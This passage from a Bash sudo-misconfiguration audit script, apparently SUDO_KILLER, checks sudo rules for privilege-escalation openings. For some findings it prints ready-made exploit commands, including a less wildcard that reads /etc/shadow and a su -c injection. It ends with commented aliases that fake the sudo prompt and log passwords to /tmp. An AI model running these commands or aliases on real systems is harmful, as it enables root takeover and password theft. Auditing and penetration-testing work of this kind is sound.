[ \"$exprv21\" ]; then\n    echo -e \"${BOLD}${RED}[+] Excessive Privilege detected [Variant 2]${RESET}\"\n    echo -e \"[-] Variant 2: %group (ALL)  ALL\"\n    echo -e \"[-] Identified rule: \\n$exprv21\"\n    echo -e \"[-] Impersonate: ${BOLD}${BLUE}Any user or group${RESET}\"\n    echo -e \"[-] Password required: ${BOLD}${BLUE}Yes (any account)${RESET}\"\n    echo -e \"[-] Command/bin: ${BOLD}${BLUE}Any${RESET}\"\n    echo -e \"[*] Notes: notes/execessive_priv.txt \\n\"\n  fi\n\n  # # Variant 6: %group (ALL)  /sbin/reboot, /sbin/shutdown\n  # regex for /etc/sudoers | grep -E '^%\\w+\\s+\\(ALL\\)\\s+/*bin/\\*'\n  exprv61=$(echo \"$cmd\" 2>/dev/null | grep -E '\\(ALL \\: ALL\\)\\s+/*bin*' | grep -v \"PASSWD\")\n  if [ \"$exprv61\" ]; then\n    echo -e \"${BOLD}${RED}[+] Excessive Privilege detected [Variant 6]${RESET}\"\n    echo -e \"[-] Variant 6: %group (ALL)  */s|bin/*\"\n    echo -e \"[-] Identified rule: \\n$exprv61\"\n    echo -e \"[-] Impersonate: ${BOLD}${BLUE}Any user or group${RESET}\"\n    echo -e \"[-] Password required: ${BOLD}${BLUE}Yes (any account)${RESET}\"\n    echo -e \"[-] Command/bin: ${BOLD}${BLUE}Listed one from identified rule${RESET}\"\n    echo -e \"[*] Notes: notes/execessive_priv.txt \\n\"\n  fi\n\n}\n\nfn_chown() {\n  #sudochownrec=`echo '' | sudo -S -l -k 2>/dev/null | grep \"(root) NOPASSWD:\" | grep \"/bin/chown -hR\"`\n  sudochownrec=$(echo \"$cmd\" 2>/dev/null | grep \"(root) NOPASSWD:\" | grep \"/bin/chown -hR\")\n  if [ \"$sudochownrec\" ]; then\n    echo -e \"${BOLD}${GREEN}[+] Sudo chown with recursive, was found: ${RESET}\"\n    echo -e \"$sudochownrec\"\n    echo -e \"\\n[-] You can change the owner of directories, refer to notes/chown-hR.txt for exploitation\\n\"\n    echo -e \"[-] run the command: sudo chown -hR [new_owner:old_owner] [/parent/children] \"\n    echo -e \"[-] Can be combined with other misconfig for complete privilege escalation such as wildcard(script)/missing script \\n\"\n    # echo -e \"[-] you can then modify or create .sh script that can be run with root right \"\n    # echo -e \"[-] #! /bin/bash \"\n    # echo -e \"[-] bash \"\n    # echo -e \"[-] sudo ./[appp].sh \\n\"\n  fi\n\n  sudochown=$(echo \"$cmd\" 2>/dev/null | grep \"(root) NOPASSWD:\" | grep \"/bin/chown\")\n  if [ \"$sudochown\" ]; then\n    echo -e \"${BOLD}${GREEN}[+] Sudo chown, was found: ${RESET}\"\n    echo -e \"$sudochown\"\n    echo -e \"\\n[-] You can change the owner of directories, refer to notes/chown-hR.txt for exploitation\\n \"\n  fi\n}\n\nfn_impersonate() {\n  #sudoimpuser=$(echo \"$cmd\" 2>/dev/null | grep \"(root) NOPASSWD:\" | grep -w \"/bin/su\")\n  #sudoimpuser=$(echo \"$cmd\" 2>/dev/null | grep \"NOPASSWD:\" | grep -iw \"/*bin/su *\")\n  sudoimpuser=$(echo \"$cmd\" 2>/dev/null | grep \"NOPASSWD:\" | grep -iw \"/*bin/su *\" | grep -v \"su root\\|su - root\" | grep -v \"/*bin/su -$\\|/*bin/su \\*$\\|/*bin/su \\- \\*$\")\n\n  if [ \"$sudoimpuser\" ]; then\n    echo -e \"${BOLD}${RED}[-] Potential user impersonation detected!${RESET}\"\n    echo -e \"${BOLD}${GREEN}[+] User Impersonation : command su found within sudo's rules: ${RESET}\"\n    echo -e \"$sudoimpuser\"\n    echo -e \"\\n[-] You can impersonate users, by running the cmd: sudo su - [USER] \"\n    echo -e \"[+] Run the SUDO_KILLER AGAIN after impersonating a user!\"\n    echo -e \"[*] Notes: notes/user_impersonation.txt \\n\"\n  fi\n\n  sudoimproot=$(echo \"$cmd\" 2>/dev/null | grep \"NOPASSWD:\" | grep -iw \"/bin/su -$\\|/bin/su - \\*$\\|/bin/su \\*$\\|/bin/su root$\\|/*bin/su - root,\")\n  if [ \"$sudoimproot\" ]; then\n    echo -e \"${BOLD}${RED}[-] Potential root impersonation detected!${RESET}\"\n    echo -e \"${BOLD}${GREEN}[+] Root Impersonation : command su found within sudo's rules: ${RESET}\"\n    echo -e \"$sudoimproot\"\n    echo -e \"\\n[-] You can impersonate root, by running the cmd:\\n ${BOLD}${BLUE}sudo su -${RESET} or ${BOLD}${BLUE}sudo su - root${RESET} or ${BOLD}${BLUE}sudo su${RESET} or ${BOLD}${BLUE}sudo su root${RESET}\"\n    echo -e \"[+] Run the SUDO_KILLER AGAIN after impersonating a user!\"\n    echo -e \"[*] Notes: notes/user_impersonation.txt \\n\"\n  fi\n  # sudo -l | grep \"NOPASSWD\"| grep -i \"/bin/su -$\"\n  # sudo -l | grep \"NOPASSWD\"| grep -i \"/bin/su - \\*$\"\n\n  # check1=$(sudo -l | grep \"NOPASSWD: /bin/su - root -c\")\n  # check2=$(sudo -l | grep \"NOPASSWD: /bin/su - root -c\" | cut -d/ -f 5- | cut -d \" \" -f 1 | grep \"\\*\")\n  # check3=$(sudo -l | grep \"NOPASSWD: /bin/su - root -c\" | cut -d/ -f 5- | cut -d \" \" -f 2 | grep \"\\*\")\n\n  # if [ -n \"$check1\" ] && [ -n \"$check2\" ] && [ -n \"$check3\" ]; then\n\n  #   var1=\"/bin/su - root -c \"\n  #   var2=$(sudo -l | grep \"NOPASSWD: /bin/su - root -c\" | cut -d \":\" -f 2 | sed 's/ \\/bin\\/su - root -c //g' | sed 's/\\*/DUMP/g')\n  #   var2=\\\"${var2}\\;id\\\"\n\n  #   echo -e \"${BOLD}${RED}[-] Vulnerable to a misconfiguration (wildcard + impersonation) ${RESET}\"\n  #   echo -e \"[+] This misconfiguration which includes wildcard and impersonation allow to PE to root \"\n  #   echo -e \"$check1\"\n  #   echo -e \"[*] Exploit: run the command below:\"\n  #   echo -e \"[*] sudo $var1$var2\"\n  #   echo -e \"\\n\"\n\n  # fi\n\n}\n\nfn_userimp() {\n  # comment due to issue > Checking sudo without password #9\n  #sudonopassuser==`echo '' | sudo -S -l -k 2>/dev/null | grep \"NOPASSWD:\" | grep \"/bin\\|/sbin\"`\n  #sudonopassuser=$(echo \"$cmd\" 2>/dev/null | grep \"NOPASSWD:\" | grep -v \"root\" | sed 's/NOPASSWD//g' | sed 's/(//g' | sed 's/)//g' | sed 's/://g')\n  sudonopassuser=$(echo \"$cmd\" 2>/dev/null | grep \"NOPASSWD:\" | grep -v \"(root)\\|(ALL\" | sed 's/NOPASSWD//g' | sed 's/(//g' | sed 's/)//g' | sed 's/://g' | sort -u)\n  if [ \"$sudonopassuser\" ]; then\n    echo -e \"${BOLD}${GREEN}[+] Can impersonate non-root user: ${RESET}\"\n    echo -e \"$sudonopassuser\"\n    echo -e \"[-] You can impersonate users, by running the cmd: sudo -u [USER] /path/bin\"\n    echo -e \"[-] Refer to section [Dangerous bins to escalate to other users] for the exact commands \\n\"\n  fi\n}\n\nfn_wildcard() {\n  # grep '*/\\|/*\\|*'  or | grep '*/\"\\|\"/*\"\\|\"*''\n  #sudowildcard=$(echo \"$cmd\" 2>/dev/null | grep \"(root) NOPASSWD:\" | grep '*/\\|/*\\|*' )\n  #sudowildcard=$(echo \"$cmd\" 2>/dev/null | grep \"(root) NOPASSWD:\" | grep '\\*' )\n  sudowildcard=$(echo \"$cmd\" 2>/dev/null | grep \"NOPASSWD:\" | grep \"(root)\\|(ALL)\\|(ALL : ALL)\" | grep '\\*')\n  if [ \"$sudowildcard\" ]; then\n    echo -e \"${BOLD}${GREEN}[+] Wildcard was found in sudo's rules: ${RESET}\"\n    echo -e \"$sudowildcard \\n\"\n  fi\n\n  #sudowildcardsh=$(echo \"$cmd\" 2>/dev/null | grep \"(root) NOPASSWD:\" | grep \"\\*\" | grep \".sh\")\n  sudowildcardsh=$(echo \"$cmd\" 2>/dev/null | grep \"NOPASSWD:\" | grep \"(root)\\|(ALL)\\|(ALL : ALL)\" | grep '\\*' | grep \".sh\")\n  if [ \"$sudowildcardsh\" ]; then\n    echo -e \"${BOLD}${GREEN}[+] Wildcard with a bash script was found in sudo's rules: ${RESET}\"\n    echo -e \"$sudowildcardsh \\n\"\n  fi\n\n sudowildcardless=$(echo \"$cmd\" 2>/dev/null | grep \"less\")\n   if [ \"$sudowildcardless\" ]; then\n       exploit1_sudowildcardless=$(echo \"$cmd\" 2>/dev/null | grep less | cut -d \":\" -f 2- | sed 's/*$/dump \\/etc\\/shadow/g' | sed s'/*/dump/g')   \n       exploit2_sudowildcardless=$(echo \"$cmd\" 2>/dev/null | grep less | cut -d \":\" -f 2- | sed 's/*$/..\\/..\\/..\\/..\\/..\\/etc\\/shadow/g' | sed s'/*/dump/g')   \n       sudowildcardlesspwd=$(echo \"$sudowildcardless\" 2>/dev/null | grep \"PASSWD\")\n        if [ \"$sudowildcardlesspwd\" ]; then\n          echo -e \"${BOLD}${GREEN}[+] Wildcard with less command detected ${RESET}${BLUE}(No password required!): ${RESET}\"\n          echo -e \"$sudowildcardless \\n\"\n          echo -e \"Exploit1: sudo$exploit1_sudowildcardless\"\n          echo -e \"Exploit2: sudo$exploit2_sudowildcardless\\n\"\n       else\n          echo -e \"${BOLD}${GREEN}[+] Wildcard with less command detected (Password required!): ${RESET}\"\n          echo -e \"$sudowildcardless \\n\"\n          echo -e \"Exploit1: sudo$exploit1_sudowildcardless\"\n          echo -e \"Exploit2: sudo$exploit2_sudowildcardless\\n\"\n       fi\n   fi\n\n  sudowildcardimpr=$(echo \"$cmd\" 2>/dev/null | grep \"/bin/su\" | grep \" -c \" | grep \"*$\" )\n   if [ \"$sudowildcardimpr\" ]; then\n\n        sudowildcardimprpwd=$(echo \"$sudowildcardimpr\" 2>/dev/null | grep \"PASSWD\")\n        if [ \"$sudowildcardimprpwd\" ]; then\n          sudowildcardimprpwd1=$(echo \"$cmd\" 2>/dev/null | grep \"/bin/su\" | grep \" -c \" | cut -d \":\" -f 2 | grep \"*$\" |  sed 's/ -c / -c \\\"/g' |sed 's/*$/dump;id\\\"/g' | sed 's/*/dump/g')\n          echo -e \"${BOLD}${GREEN}[+] Wildcard with su detected ${RESET}${BLUE}(No password required!): ${RESET}\"\n          echo -e \"$sudowildcardimpr \\n\"\n          echo -e \"Exploit: sudo$sudowildcardimprpwd1\"\n        else\n          sudowildcardimprpwd2=$(echo \"$cmd\" 2>/dev/null | grep \"/bin/su\" | grep \" -c \" | grep \"*$\" | sed 's/ -c / -c \\\"/g' | sed 's/*$/dump;id\\\"/g' | sed 's/*/dump/g')\n           echo -e \"${BOLD}${GREEN}[+] Wildcard with su detected (Password required!): ${RESET}\"\n          echo -e \"$sudowildcardimpr \\n\"\n          echo -e \"Exploit: sudo$sudowildcardimprpwd2\"\n        fi\n   fi\n\n}\n\nfn_sinject() {\n  #### Sudo Injection\n  sudoinj=$(cat /proc/sys/kernel/yama/ptrace_scope | grep 0 2>/dev/null)\n  if [ \"$sudoinj\" ]; then\n    echo -e \"${BOLD}${GREEN}[+] Ptrace is set to zero:  ${RESET}\"\n    echo -e \"[-] All processes can be debugged, as long as they have same uid\"\n    echo -e \"[-] It is possible to inject process that have valid sudo token and activate our own sudo token.\"\n    echo -e \"[*] Notes: refer to: https://github.com/nongiach/sudo_inject for more information\"\n    echo -e \"[*] Exploit: res/sudo_injec \\n\"\n  fi\n}\n\nfn_scache() {\n  sudocache=$(echo \"$cmd\" 2>/dev/null | grep \" !tty_tickets\")\n  if [ \"$sudocache\" ]; then\n    echo -e \"${BOLD}${GREEN}[+] Checking whether sudo caching is possible: ${RESET}\"\n    echo -e \"[-] Potentially vulnerable to MITRE Attack TTP T1548.003\"\n    echo -e \"[*] Notes: notes/sudo_caching.txt\"\n    echo -e \"\\n\"\n  fi\n}\n\nfn_fileownhijack() {\n  #####  Chown file reference trick (file owner hijacking)\n  #sudowildcardchown=$(echo \"$cmd\" 2>/dev/null | grep \"(root) NOPASSWD:\" | grep \"*\" | grep \"chown\")\n  sudowildcardchown=$(echo \"$cmd\" 2>/dev/null | grep \"NOPASSWD:\" | grep \"*\" | grep \"*bin/chown\\|chown \")\n  if [ \"$sudowildcardchown\" ]; then\n    echo -e \"${BOLD}${GREEN}[+] Wildcard with chown was found in sudo's rules: ${RESET} \"\n    echo -e \"$sudowildcardchown\"\n    echo -e \"\\n[-] ${BOLD}${RED}File owner hijacking possible.${RESET} \"\n    echo -e \"[*] Exploit: notes/file_owner_hijacking(chown).txt \\n\"\n  fi\n\n  #####  tar file reference trick (file owner hijacking)\n  #sudowildcardtar=$(echo \"$cmd\" 2>/dev/null | grep \"(root) NOPASSWD:\" | grep \"*\" | grep \"tar\")\n  sudowildcardtar=$(echo \"$cmd\" 2>/dev/null | grep \"NOPASSWD:\" | grep \"*\" | grep \"*bin/tar\\|tar \")\n  if [ \"$sudowildcardtar\" ]; then\n    echo -e \"${BOLD}${GREEN}[+] Wildcard with tar was found in sudo's rules: ${RESET}\"\n    echo -e \"$sudowildcardtar\"\n    echo -e \"\\n[-] ${BOLD}${RED}File owner hijacking possible.${RESET} \"\n    echo -e \"[*] Exploit: notes/file_owner_hijacking(tar).txt \\n\"\n  fi\n\n  #####  rsync file reference trick (file owner hijacking)\n  #sudowildcardrsync=$(echo \"$cmd\" 2>/dev/null | grep \"(root) NOPASSWD:\" | grep \"*\" | grep \"rsync\")\n  sudowildcardrsync=$(echo \"$cmd\" 2>/dev/null | grep \"NOPASSWD:\" | grep \"*\" | grep \"*bin/rsync\\|rsync \")\n  if [ \"$sudowildcardtar\" ]; then\n    echo -e \"${BOLD}${GREEN} [+] Wildcard with rsync was found in sudo's rules:  ${RESET}\"\n    echo -e \"$sudowildcardrsync\"\n    echo -e \"\\n[-] ${BOLD}${RED}File owner hijacking possible.${RESET} \"\n    echo -e \"[*] Exploit: notes/file_owner_hijacking(rsync).txt \\n\"\n  fi\n}\n\nfn_filepermhijack() {\n\n  #####  Chmod file reference trick(file permission hijacking)\n  #sudowildcardchmod=$(echo \"$cmd\" 2>/dev/null | grep \"(root) NOPASSWD:\" | grep \"*\" | grep \"chmod\")\n  sudowildcardchmod=$(echo \"$cmd\" 2>/dev/null | grep \"NOPASSWD:\" | grep \"*\" | grep \"*bin/chmod\\|chmod \")\n  if [ \"$sudowildcardchmod\" ]; then\n    echo -e \"${BOLD}${GREEN} [+] Wildcard with chmod was found in the sudoers file: ${RESET}\"\n    echo -e \"$sudowildcardchmod\"\n    echo -e \"\\n[-] ${BOLD}${RED}File permission hijacking possible.${RESET} \"\n    echo -e \"[*] Exploit: notes/file_permission_hijacking.txt \\n\"\n  fi\n\n}\n\ncheckmisconfig() {\n  echo -e \"${BOLD}${YELLOW}[4/21] ====== Checking for excessive privilege ====== ${RESET} \\n\"\n  fn_excess_priv\n\n  echo -e \"${BOLD}${BLUE}\\n[@] Check [4/21] Completed!${RESET} \\n\"\n\n  echo -e \"${BOLD}${YELLOW}[5/21] ====== Checking for excessive privilege (a password required) ====== ${RESET} \\n\"\n  fn_excess_priv_pwd\n\n  echo -e \"${BOLD}${BLUE}\\n[@] Check [5/21] Completed!${RESET} \\n\"\n\n  echo -e \"${BOLD}${YELLOW}[6/21] ====== Checking for Common Misconfiguration (User impersonation) ====== ${RESET} \\n\"\n  fn_impersonate\n  echo -e \"${BOLD}${BLUE}\\n[@] Check [6/21] Completed!${RESET} \\n\"\n\n  echo -e \"${BOLD}${YELLOW}[7/21] ====== Checking for Common Misconfiguration (Change owner) ====== ${RESET} \\n\"\n  fn_chown\n  echo -e \"${BOLD}${BLUE}\\n[@] Check [7/21] Completed!${RESET} \\n\"\n\n  echo -e \"${BOLD}${YELLOW}[8/21] ====== Checking for Common Misconfiguration (Wildcard) ====== ${RESET} \\n\"\n  fn_wildcard\n  echo -e \"${BOLD}${BLUE}\\n[@] Check [8/21] Completed!${RESET} \\n\"\n\n  echo -e \"${BOLD}${YELLOW}[9/21] ====== Checking for Common Misconfiguration (Sudo Injection) ====== ${RESET} \\n\"\n  fn_sinject\n  echo -e \"${BOLD}${BLUE}\\n[@] Check [9/21] Completed!${RESET} \\n\"\n\n  echo -e \"${BOLD}${YELLOW}[10/21] ====== Checking for Common Misconfiguration (Sudo Cache) ====== ${RESET} \\n\"\n  fn_scache\n  echo -e \"${BOLD}${BLUE}\\n[@] Check [10/21] Completed!${RESET} \\n\"\n\n  echo -e \"${BOLD}${YELLOW}[11/21] ====== Checking for Common Misconfiguration (File Owner Hijacking) ====== ${RESET} \\n\"\n  fn_fileownhijack\n  echo -e \"${BOLD}${BLUE}\\n[@] Check [11/21] Completed!${RESET} \\n\"\n\n  echo -e \"${BOLD}${YELLOW}[12/21] ====== Checking for Common Misconfiguration (File Permission Hijacking) ====== ${RESET} \\n\"\n  fn_filepermhijack\n  echo -e \"${BOLD}${BLUE}\\n[@] Check [12/21] Completed!${RESET} \\n\"\n\n} # checkmisconfig\n\n#------------------------------------------------------\n\nfn_miss_scripts() {\n  # offline mode check\n  if [ \"$import\" ]; then\n    echo -e \"${BOLD}${GREEN}[/] This check is excluded in the offline mode for now. ${RESET}\"\n\n  else\n    :\n    current_user=\"$(whoami)\"\n\n    groups >/tmp/groups.txt\n\n    # issue #10 > missing check on NOPAASWD\n    #sudo -S -l -k | grep \"NOPASSWD\" | sed 's/(root) //g' | sed 's/NOPASSWD: //g' | sed 's/,/\\n/g'  | sed -e 's/  *$//' | awk '$1=$1' | cut -d \" \" -f 1 | grep .sh  > $vpath/script_list\n    #echo \"$cmd\" | grep \"NOPASSWD\" | sed 's/(root) //g' | sed 's/NOPASSWD: //g' | sed 's/,/\\n/g'  | sed -e 's/  *$//' | awk '$1=$1' | cut -d \" \" -f 1 | grep .sh  > $vpath/script_list\n    echo \"$cmd\" | sed 's/(root) //g' | sed 's/NOPASSWD: //g' | sed 's/,/\\n/g' | sed -e 's/  *$//' | awk '$1=$1' | cut -d \" \" -f 1 | grep .sh >$vpath/script_list\n    #echo -e \"${BOLD}${GREEN}[+] The script/s found in sudoers can be found at: $vpath/script_list  ${RESET}\"\n    echo -e \"${BOLD}${GREEN}[+] The script/s found in sudoers can be found at: $vpath/script_list  ${RESET}\"\n\n    #### Check for missing scripts that exists in the sudoers file and whether the current user is the owner of directory\n    echo -e \"[+] Checking whether there are any missing scripts defined in sudoers but that no longer exists on system:\"\n\n    #echo -e \"\\n --------------------------------------------------------------\"\n    #cat $vpath/script_list | while read line\n    cat $vpath/script_list | while read line; do\n\n      #test\n      #echo $line\n\n      # missing file/script\n      if [ ! -f $line ]; then\n\n        rep=$(echo \"$line\" | awk -F.sh '{print $1}' | rev | cut -d \"/\" -f 2,3,4,5,6,7 | rev | cut -d \" \" -f 2)\n\n        echo -e \"\\n\"\n        echo -e \"------------------------------------------------------------------\"\n        echo -e \"[++] Missing script found:\"\n        echo $line\n        echo -e \"\\n\"\n\n        echo -e \">>> Checking Directory User Ownership of the missing script\"\n\n        #### checking whether the current user is the owner of the directory and his rights\n        repexist=$(echo '' | ls -ld $rep)\n        direc_user=$(echo \"$repexist\" | cut -d \" \" -f 3)\n\n        # r- ls on directory / w- create file / x- access the directory\n        drights=$(echo \"$repexist\" | cut -d \" \" -f 1)\n\n        # checking the owner of the directory is the current user\n        if [ \"$current_user\" == \"$direc_user\" ]; then\n          echo -e \"${BOLD}${RED}[+] The current user is the directory owner of the missing file.${RESET}\"\n\n          #### checking the permission on the directory that the owner/current user has\n\n          drightsr=${drights:1:1}\n          drightsw=${drights:2:1}\n          drightsx=${drights:3:1}\n\n          # echo $drightsr\n          # echo $drightsw\n          # echo $drightsx\n\n          msgright1=\"The current user has the right to: \"\n\n          if [ \"$drightsr\" == \"r\" ]; then\n            msgright1+=\" list since r (ls)\"\n          fi\n\n          if [ \"$drightsw\" == \"w\" ]; then\n            msgright1+=\", access w (cd) \"\n          fi\n\n          if [ \"$drightsx\" == \"x\" ]; then\n            msgright1+=\" and x create/move file/directory\"\n          fi\n\n          #msgright1+=$line\n\n          echo -e \"[-] $msgright1\"\n          echo -e \"[*] Exploit, refer to notes/owner_direc_missing_file.txt and notes/Excessive_directory_rights.txt \\n\"\n\n        else\n          echo -e \"[-] The user $direc_user is the directory owner of the missing file. \\n\"\n        fi # current user\n\n        echo -e \">>> Checking Directory Group Ownership of the missing scripts\"\n        # checking whether the current user is part of the group owner of the directory\n        direc_grp=$(echo \"$repexist\" | cut -d \" \" -f 4)\n\n        cat /tmp/groups.txt | while read line1; do\n          if [ \"$line1\" == \"$direc_grp\" ]; then\n\n            echo -e \"${BOLD}${RED}[+] The current user is in a group that is the directory owner of the missing file.${RESET}\"\n\n            dgrightsr=${drights:4:1}\n            dgrightsw=${drights:5:1}\n            dgrightsx=${drights:6:1}\n\n            msgright=\"The current user is in a group which can \"\n\n            if [ \"$dgrightsr\" == \"r\" ]; then\n              msgright+=\"list since r (ls)\"\n            fi\n\n            if [ \"$dgrightsw\" == \"w\" ]; then\n              msgright+=\", access w (cd) \"\n            fi\n\n            if [ \"$dgrightsx\" == \"x\" ]; then\n              msgright+=\" and x create/move file/directory. \\n\"\n            fi\n\n            #msgright+=$line\n\n            echo -e \"[-] $msgright\"\n            echo -e \"[*] Exploit, refer to notes/owner_direc_missing_file.txt \"\n            #echo -e \"-------------------------------------------------------\"\n            break\n          fi\n        done\n\n      fi # check file missing\n\n    done\n\n    echo -e \"\\n\"\n  fi # check offline mode\n\n}\n\nfn_excessive_dir_perm() {\n\n  # offline mode check\n  if [ \"$import\" ]; then\n    echo -e \"${BOLD}${GREEN}[/] This check is excluded in the offline mode for now. ${RESET}\"\n\n  else\n    :\n\n    #echo -e \"${BOLD}${GREEN}[+] The script/s found in sudoers can be found at: $vpath/script_list.txt ${RESET}\"\n    echo -e \"${BOLD}${GREEN}[+] The script/s found in sudoers can be found at: $vpath/script_list  ${RESET}\"\n\n    echo -e \"-------------------------------------------------------\"\n\n    #cat $vpath/script_list | while read liney\n    cat $vpath/script_list | while read liney; do\n\n      ####### [DIRECTORY]\n\n      # checking the directory rights of the scripts identified in sudo\n      if [ -f $liney ]; then\n        rep1=$(echo \"$liney\" | awk -F.sh '{print $1}' | rev | cut -d \"/\" -f 2,3,4,5,6,7 | rev | cut -d \" \" -f 2)\n\n        echo -e \"\\n\"\n        echo \"[++] Checking the directory rights for the script:\"\n        echo \"$liney\"\n        echo -e \"\\n\"\n\n        echo -e \">>> Checking Directory User Ownership of the scripts\"\n\n        #### checking whether the current user is the owner of the directory and his rights\n        repexist1=$(echo '' | ls -ld $rep1)\n        direc_user1=$(echo \"$repexist1\" | cut -d \" \" -f 3)\n\n        # r- ls on directory / w- create file / x- access the directory\n        drights1=$(echo \"$repexist1\" | cut -d \" \" -f 1)\n\n        # checking the owner of the directory is the current user\n        if [ \"$current_user\" == \"$direc_user1\" ]; then\n          echo -e \"${BOLD}${RED}[+] The current user is the directory owner of the script.${RESET}\"\n\n          #### checking the permission on the directory that the owner/current user has\n\n          drightsr1=${drights1:1:1}\n          drightsw1=${drights1:2:1}\n          drightsx1=${drights1:3:1}\n\n          msgright2=\"The current user has the right to: \"\n\n          if [ \"$drightsr1\" == \"r\" ]; then\n            msgright2+=\" list since r (ls)\"\n          fi\n\n          if [ \"$drightsw1\" == \"w\" ]; then\n            msgright2+=\", access w (cd) \"\n          fi\n\n          if [ \"$drightsx1\" == \"x\" ]; then\n            msgright2+=\"and x create/move file/directory \"\n          fi\n          #msgright2+=\"for the script : \\n\"\n          #msgright2+=$liney\n\n          echo -e \"[-] $msgright2\"\n          echo -e \"[*] Exploit, refer to notes/Excessive_directory_rights.txt \\n\"\n\n        else\n          echo -e \"[-] The user $direc_user1 is the directory owner of the script. \\n\"\n        fi # current user\n\n        echo -e \">>> Checking Directory Group Ownership of the scripts\"\n        # checking whether the current user is part of the group owner of the directory\n        direc_grp1=$(echo \"$repexist1\" | cut -d \" \" -f 4)\n\n        cat /tmp/groups.txt | while read linet; do\n          if [ \"$linet\" == \"$direc_grp1\" ]; then\n\n            echo -e \"${BOLD}${GREEN}[+] The current user is in a group that is the directory owner of the script.${RESET}\"\n\n            dgrightsr1=${drights1:4:1}\n            dgrightsw1=${drights1:5:1}\n            dgrightsx1=${drights1:6:1}\n\n            msgright3=\"The current user is in a group which can \"\n\n            if [ \"$dgrightsr1\" == \"r\" ]; then\n              msgright3+=\"list since r (ls)\"\n            fi\n\n            if [ \"$dgrightsw1\" == \"w\" ]; then\n              msgright3+=\", access w (cd) \"\n            fi\n\n            if [ \"$dgrightsx1\" == \"x\" ]; then\n              msgright3+=\" and x create/move file/directory. \"\n            fi\n\n            #msgright3+=$liney\n\n            echo -e \"[-] $msgright3\"\n            echo -e \"[*] Exploit, refer to notes/Excessive_directory_rights.txt \\n\"\n            break\n          fi\n        done\n\n        echo -e \" \\n ------------------------------------------------\"\n\n      fi\n\n    done\n  # clear the scripts list\n  # rm /tmp/sh_list.txt\n\n  fi # offline mode check\n}\n\nfn_writeable_script_perm() {\n\n  # offline mode check\n  if [ \"$import\" ]; then\n    echo -e \"${BOLD}${GREEN}[/] This check is excluded in the offline mode for now. ${RESET}\"\n\n  else\n    :\n\n    ####### [FILE]\n\n    ##### Check for writable scripts by current users from the sudoers file\n\n    #current_user=\"$(whoami)\"\n    #current_groups=\"$(groups)\"\n\n    #groups > /tmp/groups.txt\n\n    #sudo -S -l -k | grep .sh | sed 's/(root) //g' | sed 's/NOPASSWD: //g' | sed 's/,/\\n/g' |  tr -d \" \\t\\r\" | grep \".sh\" > /tmp/sh_list.txt\n\n    cat $vpath/script_list | while read linex; do\n\n      # if script exist\n      if [[ -f ${linex} ]]; then\n\n        # owner of each file/script\n        owner_file=$(echo '' | ls -l $linex | cut -d \" \" -f 3 2>/dev/null)\n\n        shperms=$(ls -l \"$linex\")\n\n        if [ \"$current_user\" == \"$owner_file\" ]; then\n\n          echo -e \">>> Checking current user permission on the scripts owned by him \\n\"\n          echo -e \"Checking the following script: $linex\"\n          #echo -e \"\\n\"\n\n          msgfp=\"The current user can \"\n\n          #shperms=$( ls -l \"$linex\" )\n          #perm_user=$( echo \"$shperms\" | cut -d \"-\" -f 2 )\n\n          frightsr=${shperms:1:1}\n          frightsw=${shperms:2:1}\n          frightsx=${shperms:3:1}\n\n          if [[ $frightsr = \"r\" ]]; then\n            msgfp+=\"read the file (r), \"\n\n          fi # perms\n\n          if [[ $frightsw = \"w\" ]]; then\n            msgfp+=\"modify the file (w), \"\n\n          fi # perms\n\n          if [[ $frightsx = \"x\" ]]; then\n            msgfp+=\"and can execute the file (x)\"\n\n          fi # perms\n\n          msgfp+=\" for the script $linex\"\n\n          echo -e \"${BOLD}${GREEN}[+] $msgfp${RESET} \\n\"\n\n          # clear var\n          owner_file=\"nothing\"\n\n        fi # user owner check\n\n        #############################################################\n\n        # checking whether the current user is part of the group owner of the directory\n        direc_grp1=$(echo \"$shperms\" | cut -d \" \" -f 4)\n\n        #echo $shperms\n        #echo $direc_grp1\n\n        cat /tmp/groups.txt | while read line2; do\n          if [ \"$line2\" == \"$direc_grp1\" ]; then\n            echo -e \">>> Checking current user group ownership of the script \\n\"\n            #echo -e \">>> Checking current user group permission on file \\n\"\n            echo -e \"${BOLD}${RED}[-] The current user is part of a group or several groups that is the owner of the script, the groups are: $line2${RESET}\"\n            #echo -e \"[-] The current user is in a group that is the file owner of the script.\"\n            # echo -e \"[+] Exploit, refer to /notes/owner_direc_missing_file.txt \"\n\n            # drightsgrp=${drights:5:3}\n\n            fgrightsr=${shperms:4:1}\n            fgrightsw=${shperms:5:1}\n            fgrightsx=${shperms:6:1}\n\n            msgfgright=\"The current user can \"\n\n            if [ \"$fgrightsr\" == \"r\" ]; then\n              msgfgright+=\"read the file (r), \"\n            fi\n\n            if [ \"$fgrightsw\" == \"w\" ]; then\n              msgfgright+=\"modify the file (w), \"\n            fi\n\n            if [ \"$fgrightsx\" == \"x\" ]; then\n              msgfgright+=\"and can execute the file (x). \"\n            fi\n\n            msgfgright+=$linex\n\n            direc_grp1=\"nothing\"\n\n            #if [[ $drightsgrp = \"rwx\" ]]\n            #  then\n            #    echo -e \"[-] $drightsgrp > The current user is in a group which can list if r (ls), access w (cd) and x create/move file/directory in the directory $line.\"\n            echo -e \"[+] $msgfgright\"\n            echo -e \"[*] Exploit, refer to notes/owner_direc_missing_file.txt \\n\"\n          #fi # permission\n          # break\n          fi # group owner check\n        done\n\n      fi # exists\n\n    done\n\n  fi # offline mode check\n\n}\n\ncheckmissing() {\n\n  echo -e \"${BOLD}${YELLOW}[13/21] ====== Checking for Missing scripts from sudo's rules ====== ${RESET} \\n\"\n  fn_miss_scripts\n  echo -e \"${BOLD}${BLUE}\\n[@] Check [13/21] Completed!${RESET} \\n\"\n\n  echo -e \"${BOLD}${YELLOW}[14/21] ====== Checking for excessive directory's permission ====== ${RESET} \\n\"\n  fn_excessive_dir_perm\n  echo -e \"${BOLD}${BLUE}\\n[@] Check [14/21] Completed!${RESET} \\n\"\n\n  echo -e \"${BOLD}${YELLOW}[15/21] ====== Checking for Writable scripts from sudo's rules ====== ${RESET} \\n\"\n  fn_writeable_script_perm\n  echo -e \"${BOLD}${BLUE}\\n[@] Check [15/21] Completed!${RESET} \\n\"\n\n} # checkmissing\n\n#------------------------------------------------------\n\n## WP\n## alias sudo='read -s -p Password: && echo -e \"\\n\" && echo -e \"$password\" >/tmp/su.log 2>/dev/null && /usr/local/bin/sudo $@'\n## alias sudo='echo -n \"Password: \" && read -s password && echo -e \"\\n\" && echo \"$USER:$password\" >>/tmp/sk.hvest.log && chmod 777 /tmp/sk.hvest.log && /usr/local/bin/sudo $@'\n## alias sudo='echo -n \"[sudo] password for $USER: \" && read 